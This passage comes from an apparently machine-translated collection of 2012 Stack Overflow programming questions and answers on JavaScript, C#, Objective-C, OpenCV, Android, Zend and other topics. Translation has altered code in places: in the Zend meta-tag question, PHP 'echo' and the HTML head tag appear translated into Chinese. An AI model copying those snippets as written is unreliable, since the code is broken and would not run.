function setDsp(mtz,dst,stdz,dayz,showDate) {var dayname = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday','Friday', 'Saturday']; var month = ['January','February','March','April','May','June','July','August','September','October','November','December']; var now = new Date; now.setUTCMinutes(now.getUTCMinutes() + (mtz + dst)*60); var dow = now.getUTCDay(); var minute = now.getUTCMinutes();
var hour = now.getUTCHours(); if (hour > 11) {ampm = 'PM'; hour -= 12;} else {ampm = 'AM'} if (hour == 0) {hour = 12;} if (minute < 10) {pad = ':0';} else {pad = ':';} var txt = hour + pad + minute + ' ' + '' + ampm + ''; if (dst) txt += dayz; else txt += stdz; txt += ' '
if (showDate == 1) txt += ' ' + now.getUTCDate() + ' '  + month[now.getUTCMonth()]  + ', ' + now.getUTCFullYear();
if (showDate == 2) txt += ' ' + month[now.getUTCMonth()] +' '  + now.getUTCDate() + ', ' + now.getUTCFullYear();
return (txt);
}
loaded('datetime',myTime); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:08:46.050

您的代码过于复杂。我建议将这个`myTime()`函数替换为只构建 HTML 而不是创建所有各种文本节点的函数。这也将 AM 或 PM 名称放在 a 中`<span class="ampm">`，因此可以适当地设置样式：

```
function myTime() {
    var dst = 0; // set to 1 for daylight savings time
    // update this as you go on and off daylight saving time
    var loc = ''; // set to your location
    var mtz = -5; // set to your local timezone (hours ahead of UTC, negative if behind)
    var stdz = ''; // standard time indicator
    var dayz = ''; // daylight saving time indicator (blank if you dont have daylight saving)
    var showDate = 0; // 0 = don't show, 1 = international format, 2 = US format

    var timeStr = setDsp(mtz, dst, stdz, dayz, showDate);
    timeStr = timeStr.replace(/AM|PM/i, '<span class="ampm">$&</span>');
    var d = document.getElementById('datetime');
    d.innerHTML = '<div id="time">' + loc + " " + timeStr + '</div>';
    setTimeout(myTime, 500);
} 
```

这是一个工作版本：http: [//jsfiddle.net/jfriend00/jTbf2/](http://jsfiddle.net/jfriend00/jTbf2/)

# c# - 我应该在 VS2010 的文件关联对话框的 ProgID 字段中输入什么？

> ID：10270496
> 
> 赞同：3
> 
> 时间：2012-04-22T17:52:13.973
> 
> 标签：c#, winforms, visual-studio, visual-studio-2010

我希望我的程序与自定义文件类型相关联，以便单击该类型的文件将使用我的程序打开它。

我已经看到我可以通过以下方式做到这一点：属性->发布->选项->文件关联。但我不知道我应该输入什么作为 ProgID。

从[Wikipedia](http://en.wikipedia.org/wiki/ProgID)看来，这是一个很长的数字（是否有特定的选择方式？）。[从这里](https://stackoverflow.com/a/2684900/939213)的答案看来，这只是我想要的任何东西。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-22T19:21:26.007

只需启动 regedit.exe 并查看其他程序如何执行此操作。progid 列在 HKEY_CLASSES_ROOT 中。您在列表中看到的文件扩展名键的（默认）值是与扩展名关联的 progid。一些常见的示例：

*   .dll = "dll 文件"
*   .exe = "exe文件"
*   .ico = "图标文件"
*   .txt = "txt 文件"

你看到了模式。不需要它看起来像这样，只是一个约定*。*“YourCompany.YourFileType”也很好，它的优点是更具描述性并避免了名称冲突。

# objective-c - 如何在 Objective-C 中做类常量？

> ID：10270497
> 
> 赞同：1
> 
> 时间：2012-04-22T17:52:15.993
> 
> 标签：objective-c, ios

有没有办法使用类似的东西

```
if (carRecord.status == CarRecord.statusRepaired) {  // using a class constant
    // ...
} 
```

例如在汽车修理店，`carRecord`对象的状态`status`会根据`CarRecord`类的常量进行检查。在Objective-C中，有没有这样的方法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T17:56:30.517

您通常会使用`enum`. 例如：

```
//=== CarRecord.h:
typedef enum CarRecordStatus {
    CarRecordStatusBroken = 0,
    CarRecordStatusRepaired
} CarRecordStatus;

@interface CarRecord (NSObject) {
    CarRecordStatus _status;
}

@property (nonatomic, assign) CarRecordStatus status;

@end

//=== CarRecord.m:
@implementation CarRecord

@synthesize status=_status;

- (void)someMethod {
    if (self.status == CarRecordStatusRepaired) {
         //...
    }
}

@end 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-22T19:37:51.760

以下是您如何在 .h 文件中定义它：

```
typedef enum CarRecordStatus {
    CarRecordStatusBroken = 0,
    CarRecordStatusRepaired,
} CarRecordStatus;

@interface MyClassName : NSObject    
..interfacebody..
@end 
```

在 MyClassName 中使用它或任何其他只需导入它就可以了。

# facebook - 注销方法不起作用

> ID：10270499
> 
> 赞同：0
> 
> 时间：2012-04-22T17:52:29.347
> 
> 标签：facebook, facebook-php-sdk, logout, facebook-javascript-sdk

我将 FB 注册集成到 WP 站点中。测试站点在这里：[http](http://teszt.avea.hu/blog/) : //teszt.avea.hu/blog/ 我可以很好地管理注册用户帐户合并/创建和登录，但我无法从 FB 注销 FB 用户，因此 FB.getLoginStatus 始终保持“连接”状态。我尝试了以下方法：

*   **PHP SDK：** `$facebook->getLogoutUrl();`生成格式良好的 URL（https、token 等）。它重定向得很好，但`FB.getLoginStatus`仍然存在`connected`
*   **JS SDK：** `FB.logout(function(){ window.location = 'http://teszt.avea.hu/';});`不注销用户。
*   **Cookie 解决方案：** `$facebook->destroySession(); setcookie('fbs_'.$facebook->getAppId(), '', time()-100, '/', '.avea.hu');`也不注销用户。我可以创建其他 cookie，但不能替换 FB cookie。

我用完了操作系统的想法。您知道为什么无法管理注销吗？是权限问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T14:16:48.007

好的，我发现了问题。我在同一个网站上同时使用了 PHP 和 JS SDK。这会导致不同的令牌和故障。谢谢

# c++ - OpenCV TrackbarSlider 奇怪的行为

> ID：10270502
> 
> 赞同：0
> 
> 时间：2012-04-22T17:52:37.003
> 
> 标签：c++, opencv, slider, trackbar

嗨，我正在阅读早期示例中的“学习 openCV”一书，但遇到了问题。

我想构建一个小视频播放器，它可以向前和向后播放单个帧，可以通过输入帧号跳转到特定帧并通过 TrackbarSlider 浏览帧。TrackbarSlider 还应该显示当前帧号。

目前我只实现了 TrackbarSlider。我希望它计算我视频的帧数，如果我在特定位置单击它，视频应该从该位置继续播放。

不幸的是，这不会发生。如果我单击滑块中的任意位置，则视频从第 0 帧开始滑块也会重置到此位置。

同样，我不明白为什么控制台会在幻灯片发生后向我显示帧号重置为 0。（我知道滑块位置从一帧到下一帧的移动会导致对 onTrackbarSlide() 的回调）

```
// Example2-3.cpp : Definiert den Einstiegspunkt für die Konsolenanwendung.
//

#include "stdafx.h"
#include "cv.h"
#include "highgui.h"
#include <iostream>

int g_slider_position = 0;
CvCapture* g_capture = NULL;

void onTrackbarSlide(int pos)
{
    cout << "TrackbarSlide occured " << endl;
    cout << "pos: " << pos << endl;
    cvSetCaptureProperty(g_capture, CV_CAP_PROP_POS_FRAMES, pos);
    cout << "Framenumber after SetTrackbarPos ";
    cout << cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES) << endl; 

}

int main(int argc, char* argv[])
{

    cout << "TEST" << endl;
    cvNamedWindow("Example3", CV_WINDOW_AUTOSIZE);
    g_capture = cvCreateFileCapture("test.avi");
    //g_capture = cvCreateFileCapture( argv[1]);
    int frames = (int) cvGetCaptureProperty(g_capture, CV_CAP_PROP_FRAME_COUNT);
    if (frames != 0)
    {
        cvCreateTrackbar( "Position","Example3",&g_slider_position,frames,onTrackbarSlide);
    }
    IplImage* frame;
    while(1)
    {

        frame = cvQueryFrame(g_capture);

        if(!frame) break;
        cvShowImage("Example3",frame);

        char c = cvWaitKey(250);
        if(c==27) break;

        cout << "Framenumber ";
        cout << cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES) << endl; 

        cvSetTrackbarPos("Position", "Example3", cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES));

    }
    cvReleaseCapture(&g_capture);
    cvDestroyWindow("Example3");
    return 0;
} 
```

这就是我从控制台得到的：控制台输出：[http ://s14.directupload.net/images/120422/9cdu7mhk.png](http://s14.directupload.net/images/120422/9cdu7mhk.png)

忘了提...以下站点可能会感兴趣：[OpenCV - 在视频播放期间让滑块更新其位置](https://stackoverflow.com/questions/5047913/opencv-getting-the-slider-to-update-its-position-during-video-playback)

谢谢你eujono

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-03T16:25:43.937

Der Fehler liegt in der Zeile

```
cvSetTrackbarPos("Position", "Example3", 
                 cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES)); 
```

Sie setzt das Video immer wieder auf den Anfang zurück。Klammere die Zeile aus und das Video läßt sich über die TrackBar einwandfrei bewegen。

Möchte man, dass der Scrollbalken mitläuft, muss die Nullsetzung abgefangen werden。zB:

```
int FramePos = cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES);
if (FramePos!=0) 
  cvSetTrackbarPos("Position", "Example3",FramePos); 
```

* * *

错误就在这条线上

```
cvSetTrackbarPos("Position", "Example3", 
                 cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES)); 
```

该命令将视频重置为开头。将该行标记为注释，它工作正常。

你想让 Trackbar 运行，调零可以被拦截。例如：

```
int FramePos = cvGetCaptureProperty(g_capture,CV_CAP_PROP_POS_FRAMES);
if (FramePos!=0) 
  cvSetTrackbarPos("Position", "Example3",FramePos); 
```

# php - Flex如何从方法内部的服务中获取数据

> ID：10270504
> 
> 赞同：0
> 
> 时间：2012-04-22T17:52:47.013
> 
> 标签：php, sql, apache-flex, dataservice

所以我的问题是我使用 php 服务从数据库中获取所有数据。计数服务和 getAllData 在组件上使用它们时工作得很好，但是当我尝试在函数中使用它们时，我什么也没得到。这真的让我很烦，我知道这很简单，但我找不到解决方案。

在职的：

```
<s:Label id="testlabel" x="162" y="67" text="{getAllMarkersResult.lastResult[1].name}"/> 
```

不工作：

```
public function test():void
        {
            testlabel.text=getAllMarkersResult.lastResult[1].name;
        } 
```

有什么帮助吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T22:55:43.613

好的，问题是为了使用 lastresult 或任何其他服务，我必须在视图启动时立即运行它们，而不是在另一个函数中。所以我创建了一个 onCreate() 函数来初始化 evarything，然后在 xlmns 上调用它： oncompletecreate:onCreate(); 一切都像魅力一样。

# pentaho - 为什么下面的 javascript 片段没有分配给 LHS？

> ID：10270508
> 
> 赞同：0
> 
> 时间：2012-04-22T17:52:58.007
> 
> 标签：pentaho

这是我第一次尝试使用 Pentaho's Spoon。

输入文件：CSV如下

```
last_name, first_name

     , Nod

 zanie, Rod

 anie, Slob

 , Vod

 meanie, Dod 
```

转换：如果 last_name 为空，则将其设置为 first_name 因此转换脚本为

```
 if ( last_name == null ){
        last_name = first_name;
    } 
```

输出文件：Coalescent.xml

麻烦的是，上面的替换根本不会发生。为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T08:24:16.303

您是否使用修改后的 JavaScript 值进行转换？尝试添加 `return last_name`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T09:02:57.780

如果要将 last_name 字段替换回流中，则需要在底部的网格中指定字段并指定 replace=Y。

# model-view-controller - wicket MVC 最佳实践

> ID：10270511
> 
> 赞同：1
> 
> 时间：2012-04-22T17:53:40.930
> 
> 标签：model-view-controller, wicket

嗨，我在 wicket 工作了一段时间，在我的团队中，我们争论了很多关于应该给予设计的地方

我认为设计应该只在标记中才能实现关注点的分离，而其他人认为我正在做的是沸腾的平台代码

例如，我们使用这种结构来支持 IE8 使用带图片的圆角：

```
<div class="panel-wrapper">
   <div class="panel-left"></div>
   <div class="panel-right"></div>
   <div class="panel-bottom"></div>
   <div class="panel-top"></div>
   <div class="panel-bottom-right"></div>
   <div class="panel-bottom-left"></div>
   <div class="panel-top-right"></div>
   <div class="panel-top-left"></div>
   <div class="panel-bg"></div>
   <div class="panel-body">
  //stuff 
 </div> 
```

我认为这与我作为开发人员的信念背道而驰，这是实现 mvc 的最佳方式，将视图与控制器分开，其他人说我们应该在检票面板中编写此代码一次，并从检票面板派生

如果 tommarow 这个组件在另一个地方并且给定的标记会给我们带来诸如使用@override getVaration 之类的问题怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-13T23:35:05.687

我认为让设计师（应该了解 CSS 和语义标记）创建页面的静态版本是个好主意，然后您可以决定如何构建面板，然后“检票”面板的标记。我认为这是设计师和开发人员可以扮演的角色。通常在决定如何创建面板时，人们可能会担心“如果标记发生变化会怎样”？.. 嗯，这就是为什么了解您的网站的路线图并了解如何重用它的原因。在我的情况下，我通常做的是创建一个没有标记的抽象面板，然后开始扩展它，而不是创建样式和类似的东西，因为这通常会导致每次您在更改时需要不同的样式时面板中的更改面板的行为取决于样式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T07:51:37.380

为什么不使用行为？通过将基本布局放入模板来保持组件清洁，但使用 AttributeAppender/AttributeModifiers 添加 CSS 类。

# css - 在屏幕上保留页脚？

> ID：10270517
> 
> 赞同：-3
> 
> 时间：2012-04-22T17:54:18.140
> 
> 标签：css, html, layout

我需要将页脚保留在浏览器窗口的底部，这不像粘页脚那样位于页面底部。

我希望它始终在屏幕上，但在浏览器窗口的底部，即使它们向上或向下滚动也是如此。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-22T17:56:00.873

`position: fixed;`就是你要找的。

例如，您可以定位您的页脚`bottom: 0; left: 0;`。

*   [在 MDN 上固定定位](https://developer.mozilla.org/en/CSS/position#Fixed_positioning)
*   [jsFiddle 演示](http://jsfiddle.net/xTRpn/)

*如果你是少数仍然关心 IE6 的不幸者之一，它不支持这一点，但是有[hacks](http://ryanfait.com/position-fixed-ie6/)。*

# android - Android 滑块选择

> ID：10270519
> 
> 赞同：1
> 
> 时间：2012-04-22T17:54:22.963
> 
> 标签：android, android-widget

我想知道解决这个问题的最佳方法......

我有一个游戏，用户选择他们所在的团队的方式是将他们选择的角色向左或向右滑动（两个团队可供选择）。

最好创建我自己的视图来执行此操作，或者是否有可用的 android 界面可以工作？

我最初的想法是使用 SeekBar，因为它有 3 个值，它具有正确的感觉（即，它通过手指滑动锁定到左侧或右侧），但我不想让进度条成为底层。我也不确定我是否可以完全改变它的外观，所以我想我需要尝试其他的东西。

# google-app-engine - 如何根据名称将 URL 动态映射到 Java servlet 处理程序？（谷歌应用引擎）

> ID：10270520
> 
> 赞同：2
> 
> 时间：2012-04-22T17:54:23.957
> 
> 标签：google-app-engine, servlets, url-routing, java-server

我正在寻找的是某种类或注释，我可以添加到专用于处理特定请求的 Java 类中，并根据它们的名称将 URL 映射到这些类。例如，将 URL“.../api/GetContactsRequest”映射到名为 GetContactsRequest 的处理程序（如果不存在此类处理程序，则为 404）。我知道我可以编写 servlet 并将每个 URL 映射到每个 servlet，但我认为样板路由代码/配置越少越好！这些将主要是应用程序请求处理程序，使用 JSON 进行通信。我还没有弄清楚我将如何处理静态请求，但我很可能只是向用户发送一个大型 Web 应用程序来导航自己或其他东西。

作为背景，我使用的是 Google App Engine，因此我可以访问 yaml 配置及其 servlet API。那么，有没有一种标准的方式来使用 Java servlet API 或 Google App Engine 特定的框架呢？我以前只使用过特定的 Java servlet 框架，例如 Apache 和其他东西，在我开始研究它们时它们都已经构建好了，所以我真的不知道在这个环境中有什么用处。一般来说，我对这一切也很陌生，并且在涉足 Servlet、服务、过滤器、侦听器和处理程序的所有内容时遇到了麻烦，这对于我想要/需要的这种简单的路由行为来说是最好的。我担心我会选错一个，或者甚至不知道适合我需要的那个。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T18:10:29.913

这就是[`JAX-RS`](http://en.wikipedia.org/wiki/Java_API_for_RESTful_Web_Services)- 不完全是类名映射，而是通过注释映射。查看[一些功能](https://wikis.oracle.com/display/Jersey/Overview+of+JAX-RS+1.0+Features)。

有几种实现，我个人使用[RESTEasy](http://www.jboss.org/resteasy) - 它在 GAE 上完美运行。此外，我使用 Jackson（带有 RESTEasy）来生成 JSON。

如果您需要生成 html，请查看[`htmleasy`](http://code.google.com/p/htmleasy/)- 它是 RESTEasy 之上的一个薄层，可以使用不同的 html 模板库。它将帮助您将逻辑与演示分开。

**编辑：**

如果您真的想避免使用标准库并自己编写一些东西，那么编写一个 servlet 过滤器来检查请求并将其转发到您的 servlet（或调用自定义代码）：

```
public class ForwardFilter implements Filter {

    @Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) {

        if(request.getRequestURI().equals("/some/path")){
            request.getRequestDispatcher("/path/where/servlet/registered").forward(request, response);
            return; // prevents normal request processing

        }

        // you need this for normal request path
        filterChain.doFilter(request, response);
    }
} 
```

# android - 将游戏从 Android SDK GLES 1.0 移植到 NDK GLES 2.0？

> ID：10270531
> 
> 赞同：0
> 
> 时间：2012-04-22T17:55:24.100
> 
> 标签：android, opengl-es, android-ndk, porting

我目前正在使用 SDK GLES10 开发一款 Android 游戏，但在三星 Galaxy Ace 等不太好的手机上遇到了一些性能问题。所以我考虑过将它移植到 NDK，也许也让它使用 GLES20，至少是消耗最多 CPU 时间的渲染部分。

（在 Galaxy S2 上，它以恒定的 61 FPS 运行，在 Galaxy Ace 上，它在 90 到 20 FPS 之间变化，并且大部分时间都卡顿）

Galaxy S2 和 Galaxy Ace 上的大多数 CPU 时间消耗方法都是`GLES10.glDrawElements()`,`GLES10.glVertexPointer()`和`GLES10.TexCoordPointer()`. 比如在 Ace 上使用了 85% 的总 CPU 时间，在 S2 上使用了 82%。

1\. 使用 NDK 进行渲染和 2\. 将其移植到 GLES20 会大大提高性能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:40:05.640

这真的可能只取决于你已经在做什么。

我会寻找**特定**的瓶颈。说“渲染”是一个瓶颈太模糊了，没有用。

究竟是什么阻碍了你？

*   SwapBuffers 调用时间？
*   OpenGL状态变化太多？
*   GPU顶点绑定？
*   GPU填充率限制？

根据对此的答案，使用 NDK 可能会有所帮助，也可能根本没有帮助，具体取决于您的 GPU 是否是限制因素。

NDK 可能会帮助您以更少的开销获得对 GPU 的调用，但您不知道这是否是真正阻碍您的原因。

如果您还没有尝试使用 DDMS 跟踪视图，并查看您的大部分时间都在哪里，那么您可以在经历重大重写的麻烦之前做出明智的决定。

# c# - 根据对象成员对 C# 数组进行排序？

> ID：10270547
> 
> 赞同：0
> 
> 时间：2012-04-22T17:56:46.490
> 
> 标签：c#, sorting

我有一个带有 2 个（双）数组成员的构造函数：

constructor[i].x 和 constructor[i].y （其中 i 是元素的数量）

如何对 x 成员进行排序： constructor[].x ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:09:36.817

使用 LINQ 它只是

```
constructor = constructor.OrderBy(a => a.x).ToArray(); 
```

没有 LINQ

```
class CustomClass
{
    public double x;
    public double y;
}

public class CustomComparer : IComparer<CustomClass>
{
    private CustomComparer() { }

    public static CustomComparer Instance { get { return _SingeltonInstance; } }

    private static CustomComparer _SingeltonInstance = new CustomComparer();

    public int Compare(CustomClass a, CustomClass b)
    {
        return a.x.CompareTo(b.x);
    }
}

public class myCode
{
    public void SomeFuction(CustomClass[] myClass)
    {
         //myClass is unsorted here;
         Array.Sort(myClass, CustomComparer.Instance);
         //myClass is sorted here;
    }
} 
```

# c++ - Armadillo C++:- 多维数据集结构中列的高效访问

> ID：10270548
> 
> 赞同：4
> 
> 时间：2012-04-22T17:56:50.703
> 
> 标签：c++, matrix, armadillo

使用犰狳矩阵库我知道访问二维矩阵中的列的有效方法是通过简单地调用 .col(i)。

我想知道是否有一种有效的方法可以提取存储在“多维数据集”中的列，而无需先调用 slice 命令？

我需要最有效的方式来访问存储在例如 A(:,i,j) 中的数据（使用 matlab 表示法）。我将在一个非常大的数据集上执行数百万次此操作，因此速度和效率是重中之重。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T18:06:18.640

我想你想要

```
 B = A.subcube( span:all, span(i), span(j) ); 
```

或等效地

```
 B = A.subcube( span(),  span(i),  span(j) ); 
```

where`B`将是与相同类型的行或列向量`A`（例如`double`，默认包含，或许多其他可用类型）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T05:17:31.933

.slice() 应该很快。它只是提供对底层 Mat 类的引用。您可以尝试以下方法：

```
cube C(4,3,2);
double* mem = C.slice(1).colptr(2); 
```

另外，请记住，犰狳默认启用范围检查。如果要避免范围检查，请使用 .at() 元素访问器：

```
cube C(4,3,2);
C.at(3,2,1) = 456; 
```

或者，您可以将矩阵存储在字段类中：

```
field<mat> F(100);
F(0).ones(12,34); 
```

对应元素访问：

```
F(0)(1,2);      // with range checks
F.at(0).at(1,2); // without range checks 
```

您还可以使用定义的 ARMA_NO_DEBUG 编译代码，这将删除所有运行时调试（例如范围检查）。这将加快您的速度，但仅在您调试完所有代码后才建议您这样做（即验证您的算法是否正常工作）。调试检查对于发现错误非常有用。

# php - 将 MySQL fetch 数组存储在变量中是否只使用一次？

> ID：10270551
> 
> 赞同：1
> 
> 时间：2012-04-22T17:57:02.337
> 
> 标签：php, mysql

我有一个论坛系统，并且`$users->permissions()`在我的 thread.php 页面中使用了很多。我想知道的是，如果我做类似`$rights = $users->permissions()`的事情，它只会让调用数据库来获得那个人的权利，而不是做类似的事情：

```
if($users->permissions() ==1) { show some mod panel }
elseif($users->permissions == 2) { show some admin panel }

SELECT  `users`.`rights` FROM `users` LEFT JOIN `sessions` ON `sessions`.`user_id` =   `users`.`id` WHERE `sessions`.`session_hash` ='".$this->con->real_escape_string($_COOKIE['session_hash'])."' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T18:05:38.297

你混淆了函数和变量。

与每次调用时都会运行的函数不同，变量不会运行任何东西。它们只包含一些价值。这就像把钱放在口袋里。一旦你从店主那里得到零钱并放入口袋，钱就会一直留在口袋里，每次你把手放在口袋里都不需要店主。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T19:49:43.530

你说的对。如果您将调用的结果存储`$users->permissions()`到一个变量（例如`$rights`）中，然后使用它来检查，那么它只会对数据库执行一次调用（并加速脚本，因为它当时正在检查本地数据而不是触发向其他地方的服务器请求）。

但是，如果您使用在初始问题中显示的代码，那么每次检查值时它都会调用数据库。

就个人而言，我会使用一个`switch`结构：

```
$rights=$users->permissions();
switch ($rights)
{
  case 1:
    //Show some form
    break;
  case 2:
    //Show something else
    break;
  default:
    //Do something just in case it's not 1 or 2
    break;
} 
```

如果您想坚持使用`if...else`语句，仍将结果存储`$users->permissions()`到变量中，然后在结构中的任何位置`$users->permissions()`，`if`将其替换为`$rights`

# facebook - Zend Framework - 添加属性不起作用的元标记

> ID：10270552
> 
> 赞同：4
> 
> 时间：2012-04-22T17:57:03.093
> 
> 标签：facebook, zend-framework, facebook-graph-api, meta-tags

我正在尝试使用我想使用元标记动态设置标题、描述和图像的 facebook 共享按钮

```
<meta property="og:title" content="title" />
<meta property="og:description" content="description" />
<meta property="og:image" content="thumbnail_image" />

```

这是同一个问题： [Zend 框架：元属性集成](https://stackoverflow.com/questions/4457467/zend-framework-meta-property-integration)

我已经尝试按照建议做 - 但它不起作用这是我在 layout.phtml 中实现的

```
<?php
$doctypeHelper = new Zend_View_Helper_Doctype();
$doctypeHelper->doctype('XHTML1_RDFA');
回声 $this->doctype();
?>

<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://opengraphprotocol.org/schema/">
<头部>
<?php echo $this->headMeta();?>
</head>

```

然后在我看来，我尝试将元属性设置为

```
<?php $this->headMeta()->setProperty('og:title', '我的文章标题');?>

```

但是这段代码不会执行，并且在呈现视图时出现错误 - 类似于

```
传递给 set 的值无效；请使用 setMeta()
C:\webserver\apache\htdocs\dezyre\trunk\library\Zend\View\Helper\HeadMeta.php(164): Zend_View_Helper_HeadMeta->set(Object(stdClass))

```

任何想法，这里有什么问题感谢您的帮助

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-22T19:55:24.273

_isValid() 方法中的视图助手中有一个隐藏的宝藏

```
// <meta property= ... /> is only supported with doctype RDFa 
```

不幸的是，您将收到的错误消息只是“请使用 setMeta()”。在您的控制器或视图中执行以下操作应该可以解决此问题。

```
$this->view->doctype('XHTML1_RDFA');  // controller
$this->doctype('XHTML1_RDFA');  // view 
```

# android - GPS 设备与服务器的通信功能

> ID：10270554
> 
> 赞同：0
> 
> 时间：2012-04-22T17:57:38.067
> 
> 标签：android, gps

嗨，我想在 android 设备中实现 gps 设备通信功能，但我不知道这些设备如何与使用这些设备数据的服务器通信并将这些数据保存在服务器上。我不得不质疑这些设备
1-服务器可以连接这些设备并获取数据并将数据保存在服务器上？或者这些设备连接到服务器并将数据发送到服务器。
这个问题对我来说很重要，因为我想为 android 设备编写应用程序，在 android 设备上模拟 gps 设备功能！
2：我研究如何从服务器连接到android设备并获取有关mqtt的信息！我可以使用 mqtt 从服务器连接到 android 设备吗？
为了在 android 设备上模拟这些设备功能，需要知道哪个服务器或设备连接到其他设备并发送数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T08:52:09.297

首先，您需要获取设备上的位置位置，然后将其发送到您的服务器，以便您可以显示此信息。务实地使用代码，您需要通过以下方式获取设备上的位置：

```
LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
locationManager.requestLocationUpdates("gps", 60000, 0, locationListener);

private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            // Here you have both location.getLatitude() and location.getLongitude()
        }
        public void onProviderDisabled(String provider){}   
        public void onProviderEnabled(String provider) {}
        public void onStatusChanged(String provider, int status, Bundle extras) {}
}; 
```

有关 Android 位置的更多信息，请参阅[User Location](http://developer.android.com/guide/topics/location/obtaining-user-location.html)的官方文档。

完成位置部分后，您可以开始将其发送到您的服务器。考虑为此使用 JSON。

假设您有一个带有“纬度经度”的字符串行，您需要先构建 JSON 对象：

```
public JSONObject buildJSONObject(String line) {
        String[] toJson = line.split(" ");
        JSONObject object = new JSONObject();
        try {
            object.put("latitude", toJson[0]);
            object.put("longitude", toJson[1]);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return object;
} 
```

然后你会用这样的东西把它发送到服务器：

```
public boolean sendTraceLineToServer(JSONObject line) {
    // The mock server IP is 10.0.2.2, just for testing purposes
    // This server receives a JSON with format {"location":{"latitude":xx.xx, "longitude":yy.yy}}
    HttpPost httpPost = new HttpPost("http://10.0.2.2:3000/locations");
    DefaultHttpClient client = new DefaultHttpClient();
    JSONObject holder = new JSONObject();

    boolean sent = false; 

    try {
        holder.put("location", line);

        StringEntity se = new StringEntity(holder.toString());
        httpPost.setEntity(se);
        httpPost.setHeader("Content-Type","application/json");
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    } catch (JSONException e) {
        e.printStackTrace();
    }

    HttpResponse response = null;

    try {
        response = client.execute(httpPost);
        sent = true;
    } catch (ClientProtocolException e) {
        e.printStackTrace();
        Log.e("ClientProtocol",""+e);
    } catch (IOException e) {
        e.printStackTrace();
        Log.e("IO",""+e);
    }

    HttpEntity entity = response.getEntity();

    if (entity != null) {
        try {
            entity.consumeContent();
        } catch (IOException e) {
            Log.e("IO E",""+e);
            e.printStackTrace();
        }
    }
    return sent;
} 
```

[这里](https://stackoverflow.com/questions/3027066/how-to-send-a-json-object-over-request-with-android)有更多关于如何将 JSON 发布到服务器的示例。

在服务器上，就我而言，我是在[Rails](http://rubyonrails.org/)中编写的，我创建了一个接收 JSON 的方法，如下所示：

```
# POST /locations
# POST /locations.xml

def create
    @location = Location.new(params[:location])
    respond_to do |format|
      if @location.save
        format.json { render :json => @location, :status => :created, :location => @location }
      else
        format.json { render :json => @location.errors, :status => :unprocessable_entity }
      end
    end
  end 
```

就是这样，设备上的位置，使用带有 JSON 的 HTTP 发送它，并在示例 Rails 服务器上接收。

# html - Android 浏览器中不成比例的字体大小（SDK 模拟器）

> ID：10270555
> 
> 赞同：0
> 
> 时间：2012-04-22T17:57:44.583
> 
> 标签：html, android-layout, scale

我无法理解 Android 浏览器在缩放文本方面的行为。这是我的 HTML 代码：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=600">
<title>TestBug</title>
<style type="text/css">
    html, body {
        font-size:16px;
        font-family: Arial, sans-serif;
    }
    p {
        width:600px;
        margin:0 auto;
        height:200px;
        background-color:#bbeabb;
        font-size:16px;
    }
</style>
</head>
<body>
    <p>
    Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do
    eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad
    minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip
    ex ea commodo consequat. Duis aute irure dolor in reprehenderit in
    voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur
    sint occaecat cupidatat non proident, sunt in culpa qui officia
    deserunt mollit anim id est laborum.
    </p>
</body>
</html> 
```

问题是这里有一个固定高度的 p 元素。此 p 中的文本也具有定义为 16 像素的字体大小。有一张它在桌面上的样子：

![具有固定 200px 高度的段落，在桌面浏览器中显示](../Images/bcd9815f5e3093f2b5d70ef382b98c6f.png)

当我在 Android 浏览器中查看同一页面时，我希望看到与桌面浏览器中完全相同的页面（带有绿色背景的段落和其中的文本不会溢出），即预期的行为是 Android 浏览器必须保持比例，所以内部文本大约占段落高度的一半。但相反，下一个正在发生：

![具有固定 200px 高度的段落，在 android 浏览器中显示](../Images/64deaaddf56bbf2156fe03f989963612.png)

如您所见，虽然段落的高度和宽度是根据宽度为 600 px 的 viewport-metatag 的使用进行缩放的，但文本的高度并未相应地缩放。

不过，当我使用“em”单位时，一切都很好。

有人可以解释一下这里发生了什么吗？

